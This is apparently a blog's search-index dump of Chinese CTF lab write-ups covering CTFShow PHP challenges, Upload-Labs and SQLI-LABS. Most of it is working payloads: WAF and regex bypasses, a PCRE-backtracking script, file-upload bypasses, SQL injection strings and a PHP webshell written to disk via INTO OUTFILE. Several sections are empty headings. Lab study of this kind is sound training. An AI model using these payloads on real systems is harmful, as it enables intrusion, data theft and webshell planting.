#POST payload3: ?a=1+fl0g=flag_give_me #GET CTF_SHOW=1&amp;CTF[SHOW.COM=1&amp;fun=parse_str($a[1]) #POST parse_str — 将字符串解析成多个变量 web125error_reporting(0); highlight_file(__FILE__); include(\"flag.php\"); $a=$_SERVER['argv']; $c=$_POST['fun']; if(isset($_POST['CTF_SHOW'])&amp;&amp;isset($_POST['CTF_SHOW.COM'])&amp;&amp;!isset($_GET['fl0g'])){ if(!preg_match(\"/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\%|\\^|\\*|\\-|\\+|\\=|\\{|\\}|\\\"|\\'|\\,|\\.|\\;|\\?|flag|GLOBALS|echo|var_dump|print/i\", $c)&amp;&amp;$c&lt;=16){ eval(\"$c\".\";\"); if($fl0g===\"flag_give_me\"){ echo $flag; } } } ?&gt; ?$fl0g=flag_give_me; #GET CTF_SHOW=1&amp;CTF[SHOW.COM=1&amp;fun=eval($a[0]) #POST web126error_reporting(0); highlight_file(__FILE__); include(\"flag.php\"); $a=$_SERVER['argv']; $c=$_POST['fun']; if(isset($_POST['CTF_SHOW'])&amp;&amp;isset($_POST['CTF_SHOW.COM'])&amp;&amp;!isset($_GET['fl0g'])){ if(!preg_match(\"/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\%|\\^|\\*|\\-|\\+|\\=|\\{|\\}|\\\"|\\'|\\,|\\.|\\;|\\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i\", $c) &amp;&amp; strlen($c)&lt;=16){ eval(\"$c\".\";\"); if($fl0g===\"flag_give_me\"){ echo $flag; } } } payload1: ?$fl0g=flag_give_me; #GET CTF_SHOW=1&amp;CTF[SHOW.COM=1&amp;fun=eval($a[0]) #POST payload2: ?a=1+fl0g=flag_give_me #GET CTF_SHOW=1&amp;CTF[SHOW.COM=1&amp;fun=parse_str($a[1]) #POST web127error_reporting(0); include(\"flag.php\"); highlight_file(__FILE__); $ctf_show = md5($flag); $url = $_SERVER['QUERY_STRING']; //特殊字符检测 function waf($url){ if(preg_match('/\\`|\\~|\\!|\\@|\\#|\\^|\\*|\\(|\\)|\\\\$|\\_|\\-|\\+|\\{|\\;|\\:|\\[|\\]|\\}|\\'|\\\"|\\&lt;|\\,|\\&gt;|\\.|\\\\\\|\\//', $url)){ return true; }else{ return false; } } if(waf($url)){ die(\"嗯哼？\"); }else{ extract($_GET); } if($ctf_show==='ilove36d'){ echo $flag; } extract — 从数组中将变量导入到当前的符号表 ?ctf show=ilove36d=&gt;$ctf show=ilove36d get传参，并赋值给$url，让waf($url)==false，执行extract($_GET);，把get传入的值导入，然后过if语句就o了 payload1 在web123就了解过，点或空格会被转化为下划线，由于点被过滤 ，所以可以用上空格。 ?ctf show=ilove36d payload2 $_SERVER['QUERY_STRING'];获取的查询语句是服务端还没url解码之前的字符串，所以对_进行一次url编码也能绕过。 ?ctf%5fshow=ilove36d web128include(\"flag.php\"); highlight_file(__FILE__); $f1 = $_GET['f1']; $f2 = $_GET['f2']; if(check($f1)){ var_dump(call_user_func(call_user_func($f1,$f2))); }else{ echo \"嗯哼？\"; } function check($str){ return !preg_match('/[0-9]|[a-z]/i', $str); call_user_func 回调函数 PHP中所讲的回调函数，其实就是指调用函数时不是向函数中传递标准的变量作为参数，而是将另一个函数作为参数，传递到调用的函数中，回调函数也就是这个作为参数的函数。 $str = call_user_func($v1,$s);就是将s作为v1函数的参数 _()是gettext()的拓展函数 在开启相关设定后，_(\"0\")等价于gettext(\"0\")，且就返回参数0 //_=gettext &lt;?php echo gettext(666); //输出 666 echo _(\"666\"); //输出 666 ?&gt; //https://www.cnblogs.com/lost-1987/articles/3309693.html get_defined_vars — 返回由所有已定义变量所组成的数组 var_dump(call_user_func(call_user_func($f1,$f2))); =&gt; var_dump(call_user_func(call_user_func(_,'get_defined_vars'))); =&gt; var_dump(call_user_func(get_defined_vars)); f1=_&amp;f2=get_defined_vars web129highlight_file(__FILE__); if(isset($_GET['f'])){ $f = $_GET['f']; if(stripos($f, 'ctfshow')&gt;0){ echo readfile($f); } stripos(string $haystack, string $needle, int $offset = 0)查找字符串在另一字符串中第一次出现的位置（不区分大小写） int 返回在字符串 haystack 中 needle 首次出现的数字位置，找的是needle与 strpos() 不同，stripos() 不区分大小写 如果未发现 needle 将返回 false。 //后面会用到 readfile(string $filename, bool $use_include_path = false, resource $context = ?): int 读取文件并写入到输出缓冲。 参数 filename 要读取的文件名。 use_include_path 想要在 include_path 中搜索文件，可使用这个可选的第二个参数，设为 true。 context Stream 上下文（context） resource。 返回值 成功时返回从文件中读入的字节数， 或者在失败时返回 false filter伪协议支持多种编码方式，无效的就被忽略掉了 ?f=php://filter/read=convert.base64-encode|ctfshow/resource=flag.php ?f=php://filter/|ctfshow/resource=flag.php ?f=/ctfshow/../var/www/html/flag.php ?f=./ctfshow/../flag.php web130include(\"flag.php\"); if(isset($_POST['f'])){ $f = $_POST['f']; if(preg_match('/.+?ctfshow/is', $f)){//不能匹配到/.+?ctfshow/ die('bye!'); } if(stripos($f, 'ctfshow') === FALSE){//传的$f中有ctfshow die('bye!!'); } echo $flag; } payload1 PCRE回溯次数限制 https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html PHP为了防止正则表达式的拒绝服务攻击（reDOS），给pcre设定了一个回溯次数上限pcre.backtrack_limit。我们可以通过var_dump(ini_get(‘pcre.backtrack_limit’));的方式查看当前环境下的上限 //1000000次 如果回溯次数超过了100万，preg_match返回的非1和0，而是false。 这样也就达到绕过preg_match的目的，通过发送超长字符串的方式，使正则执行失败： import requests url=\"http://d982e941-58a2-4bbb-8e2e-298bdb38ac17.challenge.ctf.show/\" data={\"f\":\"1111\"*250000+\"ctfshow\"} response=requests.post(url=url,data=data) print(response.text) web131include(\"flag.php\"); if(isset($_POST['f'])){ $f = (String)$_POST['f']; if(preg_match('/.+?ctfshow/is', $f)){ die('bye!'); } if(stripos($f,'36Dctfshow') === FALSE){ die('bye!!'); } echo $flag; import requests url=\"http://46824a94-4dcc-45df-9cde-cbd6343c7e49.challenge.ctf.show/\" data={\"f\":\"1111\"*250000+\"36Dctfshow\"} response=requests.post(url=url,data=data) print(response.text) web132if(isset($_GET['username']) &amp;&amp; isset($_GET['password']) &amp;&amp; isset($_GET['code'])){ $username = (String)$_GET['username']; $password = (String)$_GET['password']; $code = (String)$_GET['code']; if($code === mt_rand(1,0x36D) &amp;&amp; $password === $flag || $username ===\"admin\"){ if($code == 'admin'){ echo $flag; } } } php中&amp;&amp;和||运算符应用 访问/robots.txt,之后访问/admin，获得源代码 对于“与”（&amp;&amp;） 运算： x &amp;&amp; y 当x为false时，直接跳过，不执行y； 对于“或”（||） 运算 ： x||y 当x为true时，直接跳过，不执行y。 payload: ?username=admin&amp;password=admin&amp;code=admin web133web134web135web135web137web138web139web140web141web142web143web144web145web146web147web148web149web150","categories":[{"name":"CTFShow","slug":"CTFShow","permalink":"http://example.com/categories/CTFShow/"}],"tags":[{"name":"CTFShow","slug":"CTFShow","permalink":"http://example.com/tags/CTFShow/"},{"name":"刷题","slug":"刷题","permalink":"http://example.com/tags/%E5%88%B7%E9%A2%98/"}]},{"title":"Uploads-Labs","slug":"Upload-Labs","date":"2022-11-30T10:49:36.000Z","updated":"2022-12-01T12:29:57.793Z","comments":true,"path":"/post/Upload-Labs.html","link":"","permalink":"http://example.com/post/Upload-Labs.html","excerpt":"","text":"Upload-Labs Pass-011使用一句话木马，直接进行上传，发现php后缀被限制，修改为jpg后缀重新上传，上传成功。 使用Burpsuite抓包 将jpg后缀修改为php，发包 就可以将php为后缀的文件上传到网站，使用蚁剑，复制图片地址 2直接查看源码，发现就是js有一个checkFile()，将浏览器关闭js 修改后就可以直接上传php文件，重复上述步骤 源码 就是对文件后缀做限制 Pass-02 服务器MIME检测：即检测Content-Type的内容。 绕过方法：修改类型为允许上传的类型即可。 直接上传php文件，文件类型不正确，使用burpsuite抓包 修改Content-Type为image/jpeg、image/png、image/gif 上传成功 源码就是对文件类型进行判断 Pass-03上传php文件 基于黑名单检测：黑名单的安全性比白名单的安全性低很多，攻击手法自然也比白名单多。一般由个专门blacklist，里面包含常见的危险脚本文件。 绕过办法： 文件大小写让绕过（Php ，PhP pHp，等） 黑白名单绕过（php，php2，php3，php5，phtml，asp，aspx，ascx，ashx，cer，asa，jsp，jspx）cdx，\\x00hh\\x46php 基于白名单验证：只针对白名单中有的后缀名，文件才能上传成功。 基于黑名单验证：只针对黑名单中没有的后缀名，文件才能上传成功。 用黑名单不允许上传.asp,.aspx,.php,.jsp后缀的文件，但可以上传.phtml、 .php3 .php5、php4、 .pht、php1、php2、phps【这些后缀会被当成php文件解析】等等。 特殊文件名绕过 修改数据包里的文件名为 test.php 或 test.asp_(下划线是空格)由于这种命名格式在 windows系统里是不允许的，所以在绕过上传之后windows系统会自动去掉.点和空格。Linux和Unix中没有这个特性。 ::$DATA(php在windows的时候如果文件名+”::DATA”会把::DATA之后的数据当作文件流处理，不会检测后缀名，且保持”::DATA”之前的文件名，其目的就是不检查后缀名) . .htaccess文件攻击（结合黑名单攻击） 解析绕过 使用双写绕过，因为会过滤::$DATA 源码 Pass-04.htaccess是什么： 全称是Hypertext Access(超文本入口) .htaccess文件也被成为分布式配置文件，提供了针对目录改变配置的方法，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。 .htaccess功能： 文件夹密码保护、用户自定义重定向、自定义404页面、扩展名伪静态化、禁止特定IP地址的用户、只允许特定IP地址的用户、禁止目录列表 很可惜，这么一个强大的功能默认是不开启的 Apache （有伪静态的都可以试试） 用法： AddType application/x-httpd-php .jpg 这个指令代表着.jpg文件会当做php来解析 SetHandler application/x-httpd-php，意思是把所有文件都解析为php文件来执行。 Pass-05Pass-06 Pass-07 Pass-08 Pass-09 Pass-10 Pass-11 Pass-12 Pass-13 Pass-14 Pass-15 Pass-16 Pass-17 Pass-18 Pass-20 Pass-21","categories":[{"name":"CTF","slug":"CTF","permalink":"http://example.com/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://example.com/tags/CTF/"},{"name":"文件上传漏洞","slug":"文件上传漏洞","permalink":"http://example.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"}]},{"title":"SQL-LIB","slug":"SQLI-LABS","date":"2022-11-30T10:49:36.000Z","updated":"2022-11-29T17:08:43.935Z","comments":true,"path":"/post/SQLI-LABS.html","link":"","permalink":"http://example.com/post/SQLI-LABS.html","excerpt":"","text":"Less-1判断是否存在注入: ?id=1' and 1=1 --+ 判断字段数: ?id=1' order by 3--+ 判断显错位: ?id=-1' union select 1,2,3--+ 判断库名: ?id=-1' union select 1,database(),3--+ 判断表名: ?id=-1' union select 1,table_name,3 from information_schema.tables where table_schema='security'--+ ?id=-1' union select 1,table_name,3 from information_schema.tables where table_schema='security' limit 3,1--+ ?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'--+ //可能会因为显示位不全，显示错误 判断列名: ?id=-1' union select 1,column_name,3 from information_schema.columns where table_schema='security' and table_name='emails'--+ ?id=-1' union select 1,column_name,3 from information_schema.columns where table_schema='security' and table_name='users'--+ 判断数据: ?id=-1' union select 1,id,3 from emails--+ Less-2类第一关 Less-3(‘1’) 判断是否存在注入: ?id=1') and 1=1 --+ 下面类第一关 Less-4$id = '\"' . $id . '\"'; $sql=\"SELECT * FROM users WHERE id=($id) LIMIT 0,1\"; 判断是否存在注入: ?id=1\") and 1=1 --+ 下面类第一关 Less-5盲注&amp;报错注入 $sql=\"SELECT * FROM users WHERE id='$id' LIMIT 0,1\"; $result=mysql_query($sql); $row = mysql_fetch_array($result); if($row) { echo '&lt;font size=\"5\" color=\"#FFFF00\"&gt;'; echo 'You are in...........'; echo \"&lt;br&gt;\"; echo \"&lt;/font&gt;\"; } else { echo '&lt;font size=\"3\" color=\"#FFFF00\"&gt;'; print_r(mysql_error()); echo \"&lt;/br&gt;&lt;/font&gt;\"; echo '&lt;font color= \"#0000ff\" font size= 3&gt;'; } } else { echo \"Please input the ID as parameter with numeric value\";} 判断是否存在注入: ?id=1' and 1=1 --+ 判断字段数: ?id=1' order by 3--+ 判断显错位: 盲注没有显错位 判断库名: ?id=1' and updatexml(1,concat(0x7e,(SELECT database()),0x72),1)--+ 判断表名: ?id=1' and updatexml(1,concat(0x7e,(SELECT table_name from information_schema.tables where table_schema='security'limit 0,1),0x7e),1)--+ 判断列名: ?id=1' and updatexml(1,concat(0x7e,(SELECT column_name from information_schema.columns where table_schema='security' and table_name='users' limit 0,1),0x7e),1)--+ 判断数据: ?id=1' and updatexml(1,concat(0x7e,(SELECT id from users limit 0,1),0x7e),1)--+ updatexml() 更新xml文档的函数 语法：updatexml(目标xml内容，xml文档路径，更新的内容) updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) 实际上这里是去更新了XML文档，但是我们在XML文档路径的位置里面写入了子查询，我们输入特殊字符，然后就因为不符合输入规则然后报错了 但是报错的时候他其实已经执行了那个子查询代码！ [0x7e实际是是16进制，Mysql支持16进制，但是开头得写0x 0x7e是一个特殊符号，然后不符合路径规则报错]~ ~ 添加一个不符合规则的符号进行报错，从而爆出子查询的内容：SELECT database() updatexml ()这个函数一般是配合and或者是or使用的，他和联合查询不同，不需要在意什么字段数 eg: select *from news where id=1 and updatexml(1,concat(0x7e,(select database()),0x7e),1) 但是要注意，and情况下只要一个为False，就会判定是False,所以如果and前面的条件不成立的情况下，就不会执行之后的语句。所以使用的时候建议使用or 某些没有回显盲注也可以用这个updatexml()做出来。 但是报错一般有长度限制，不能输出太长的数据，尽量不要使用group_concat()。 SELECT * FROM users union select updatexml(1,concat(0x7e,(SELECT database()),0x7e),1); 1105 - XPATH syntax error: '~security~' Less-6判断是否存在注入: ?id=1\" and 1=1 --+ 其他类题5 Less-7outfile 向服务器写入文件 在利用sql注入漏洞后期，最常用的就是通过mysql的file系列函数来进行读取敏感文件或者写入webshell，其中比较常用的函数有以下三个： 写 into dumpfile()//保留格式 into outfile()//原始数据 读 load_file() union select 1,'&lt;?php eval($_REQUEST[8])?&gt;' into outfile 'c:/phpstudy/www/1.php' 这些都是需要设置secure_file_priv=，如果他为空则可以指定任意目录，如果有设置等于某个路径就只能在这个指定路径下，而他为null时则禁止导入导出功能 判断字段数: ?id=1')) order by 3 --+ 写马: ?id=1')) union select 1,\"&lt;?php eval($_REQUEST[1])?&gt;\",3 into outfile \"D:/AppData/phpstudy_pro/WWW/sqli-labs-master/Less-7/shell.php\" --+ 访问一句话木马 http://127.0.0.1:8090/Less-7/shell.php?1=phpinfo(); Less-8盲注 布尔型盲注: length()函数 返回字符串长度 substr() 截取字符串 (语法：SUBSTR(str,pos,len);) ascii() 返回字符的ascii码 [将字符变为数字wei] 时间型盲注: sleep()将程序挂起一段时间 n为n秒 if(expr1,expr2,expr3)判断语句 如果第一个语句正确就执行第二个语句，如果错误执行第三个语句 拆解库名长度 ?id=1' and (length(database()))=8 --+ 利用ASCII码猜解当前数据库名称： ?id=1' and (ascii(substr(database(),1,1)))=115 --+ 返回正常，说明数据库名称第一位是s ?id=1' and (ascii(substr(database(),2,1)))=101 --+ 返回正常，说明数据库名称第二位是e 猜表名: ?id=1' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))=101 --+ 如果返回正常，说明数据库表名的第一个的第一位是e 猜字段名: ?id=1' and (ascii(substr((select column_name from information_schema.columns where table_name='emails' limit 0,1),1,1)))=105 --+ 如果返回正常，说明emails表中的列名称第一位是i Less-9同样按照盲注的手法，尝试后发现这里无论输入什么条件，回显的结果都是一个，这就证明不能再用刚刚布尔盲注的做法了，要尝试使用时间盲注 布尔盲注页面会有两种状态 时间盲注无论条件是什么都只返回一种页面 猜解库名长度: ?id=1' and if(length(database())=8,sleep(5),1) --+ 利用ASCII码猜解当前数据库名称: ?id=1' and if((ascii(substr(database(),1,1))=115),sleep(5),1) --+ 延时，说明数据库名称第一位是s 猜表名: ?id=1' and if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101),sleep(5),1) --+ 延时，说明数据库表名的第一个的第一位是e 猜字段名: ?id=1' and if((ascii(substr((select column_name from information_schema.columns where table_name='emails' limit 0,1),1,1))=105),sleep(5),1) --+ 如果返回正常，说明emails表中的列名称第一位是i Less-10闭合方式有区别 ?id=1\" and if(length(database())=8,sleep(5),1) --+ 其他类题九 Less-11POST传参 $uname=$_POST['uname']; $passwd=$_POST['passwd']; @$sql=\"SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1\"; 万能密码: ' or 1=1 -- + //要有空格 ' or 1=1# 判断字段数: ' or 1=1 order by 2 -- + 判断显错位: ' union select 1,2# 判断库名: ' union select 1,database()# 判断表名: ?id=10' union select 1,table_name from information_schema.tables where table_schema='security'# 判断列名: ?id=10' union select 1,column_name from information_schema.columns where table_schema='security' and table_name ='users' limit 1,1# 判断数据: ?id=10' union select 1,username from users# Less-12闭合有区别，尝试万能密码 \") or 1=1# 其他类题十一 Less-13post传参的报错注入 判断是否存在注入: ?id=1' and 1=1 -- qwe 判断库名: ')and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)-- qwe 判断表名： ')and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='security'limit 0,1),0x7e),1)-- qwe 判断列名： ')and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema='security' and table_name='emails' limit 0,1),0x7e),1)-- qwe 判断数据： ')and updatexml(1,concat(0x7e,(select id from emails limit 0,1),0x7e),1)-- qwe 类题五 Less-14类题13 判断库名： \"and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)-- qwe Less-15POST盲注 if(isset($_POST['uname']) &amp;&amp; isset($_POST['passwd'])) { $uname=$_POST['uname']; $passwd=$_POST['passwd']; //logging the connection parameters to a file for analysis. $fp=fopen('result.txt','a'); fwrite($fp,'User Name:'.$uname); fwrite($fp,'Password:'.$passwd.\"\\n\"); fclose($fp); // connectivity @$sql=\"SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1\"; $result=mysql_query($sql); $row = mysql_fetch_array($result); if($row) { //echo '&lt;font color= \"#0000ff\"&gt;'; echo \"&lt;br&gt;\"; echo '&lt;font color= \"#FFFF00\" font size = 4&gt;'; //echo \" You Have successfully logged in\\n\\n \" ; echo '&lt;font size=\"3\" color=\"#0000ff\"&gt;'; echo \"&lt;br&gt;\"; //echo 'Your Login name:'. $row['username']; echo \"&lt;br&gt;\"; //echo 'Your Password:' .$row['password']; echo \"&lt;br&gt;\"; echo \"&lt;/font&gt;\"; echo \"&lt;br&gt;\"; echo \"&lt;br&gt;\"; echo '&lt;img src=\"../images/flag.jpg\" /&gt;'; echo \"&lt;/font&gt;\"; } else { echo '&lt;font color= \"#0000ff\" font size=\"3\"&gt;'; //echo \"Try again looser\"; //print_r(mysql_error()); echo \"&lt;/br&gt;\"; echo \"&lt;/br&gt;\"; echo \"&lt;/br&gt;\"; echo '&lt;img src=\"../images/slap.jpg\" /&gt;'; echo \"&lt;/font&gt;\"; } } 猜解库名长度: ' or (length(database()))=8 # 利用ASCII码猜解当前数据库名称: ' or (ascii(substr(database(),1,1)))=115# 返回正常，说明数据库名称第一位是s ' or (ascii(substr(database(),2,1)))=101# 返回正常，说明数据库名称第二位是e 猜表名: ' or (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))=101# 如果返回正常，说明数据库表名的第一个的第一位是e 猜字段名: 'or (ascii(substr((select column_name from information_schema.columns where table_name='emails' limit 0,1),1,1)))=105# 如果返回正常，说明emails表中的列名称第一位是i Less-16$uname='\"'.$uname.'\"'; $passwd='\"'.$passwd.'\"'; @$sql=\"SELECT username, password FROM users WHERE username=($uname) and password=($passwd) LIMIT 0,1\"; 类题15 闭合区别 \") or (length(database()))=8 # Less-17密码重置，所以从下面的password入手，使用报错注入 判断是否存在注入: ' or 1=1 -- + 判断库名: ' and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)--+ 判断表名: ' and updatexml(1,concat(0x7e,(SELECT table_name from information_schema.tables where table_schema='security'limit 0,1),0x7e),1)--+ 判断列名: ' and updatexml(1,concat(0x7e,(SELECT column_name from information_schema.columns where table_schema='security' and table_name='users' limit 0,1),0x7e),1)--+ 判断数据: ' and updatexml(1,concat(0x7e,(SELECT id from users limit 0,1),0x7e),1)--+ Less-18进入网站就显示了ip，网页记录了ip、浏览器信息以及其他信息就可能是头注入 请求头 User-Agent 浏览器的身份标识字符串 Referer 表示浏览器所访问的前一个页面，可以认为是之前访问页面的链接将浏 览器带到了当前页面。 Accept 可接受的响应内容类型（Content-Types）。 X-Forwarded-For 可以用来表示HTTP请求端真实IP Date 发送该消息的日期和时间（以RFC 7231中定义的\"HTTP日期\"格式来发 送） $insert = \"INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)\"; 注入点为uagent即User-Agent 必须要登录成功才会记录IP，弱口令 uname=admin&amp;passwd=admin 判断库名: 'and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1),1,1)-- # $insert = \"INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (''and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1),1,1)-- #', '$IP', $uname)\"; 后面的1,1)为了补齐后面'$IP', $uname两个字段 判断表名: 'and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='security'limit 0,1),0x7e),1),1,1)-- # 判断列名: 'and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema='security' and table_name='emails' limit 0,1),0x7e),1),1,1)-- qwe 判断数据: 'and updatexml(1,concat(0x7e,(select id from emails limit 0,1),0x7e),1),1,1)-- qwe Less-19注入点与18不同，其他类18 注入点变为referer $insert=\"INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES ('$uagent', '$IP')\"; Less-20登录之后会显示很多个人信息，特别是提示cookie 诸如点是cookie $sql=\"SELECT * FROM users WHERE username='$cookee' LIMIT 0,1\"; 判断库名: 'and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)-- qwe 判断表名: 'and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='security'limit 0,1),0x7e),1)-- qwe 判断列名: 'and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema='security' and table_name='emails' limit 0,1),0x7e),1)-- qwe 判断数据: 'and updatexml(1,concat(0x7e,(select id from emails limit 0,1),0x7e),1)-- qwe Less-21Cookie被base64编码，把payload用base64编码再发包 判断库名: admin 'and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) and '1'='1 YWRtaW4gJ2FuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSwoU0VMRUNUIGRhdGFiYXNlKCkpLDB4N2UpLDEpIGFuZCAnMSc9JzE= 判断表名: admin 'and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='security'limit 0,1),0x7e),1) and '1'='1 判断列名: 'and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema='security' and table_name='emails' limit 0,1),0x7e),1) and '1'='1 判断数据: and updatexml(1,concat(0x7e,(select id from emails limit 0,1),0x7e),1)and '1'='1 Less-22Less-23","categories":[{"name":"CTF","slug":"CTF","permalink":"http://example.com/categories/CTF/"}],"tags":[{"name":"刷题","slug":"刷题","permalink":"http://example.com/tags/%E5%88%B7%E9%A2%98/"},{"name":"CTF","slug":"CTF","permalink":"http://example.com/tags/CTF/"},{"name":"数据库注入","slug":"数据库注入","permalink":"http://example.com/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5/"}]}],"categories":[{"name":"CTFShow","slug":"CTFShow","permalink":"http://example.com/categories/CTFShow/"},{"name":"PHP","slug":"PHP","permalink":"http://example.com/categories/PHP/"},{"name":"CTF","slug":"CTF","permalink":"http://example.com/categories/CTF/"}],"tags":[{"name":"CTFShow","slug":"CTFShow","permalink":"http://example.com/tags/CTFShow/"},{"name":"刷题","slug":"刷题","permalink":"http://example.com/tags/%E5%88%B7%E9%A2%98/"},{"name":"PHP","slug":"PHP","permalink":"http://example.com/tags/PHP/"},{"name":"CTF","slug":"CTF","permalink":"http://example.com/tags/CTF/"},{"name":"文件上传漏洞","slug":"文件上传漏洞","permalink":"http://example.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"name":"数据库注入","slug":"数据库注入","permalink":"http://example.com/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5/"}]}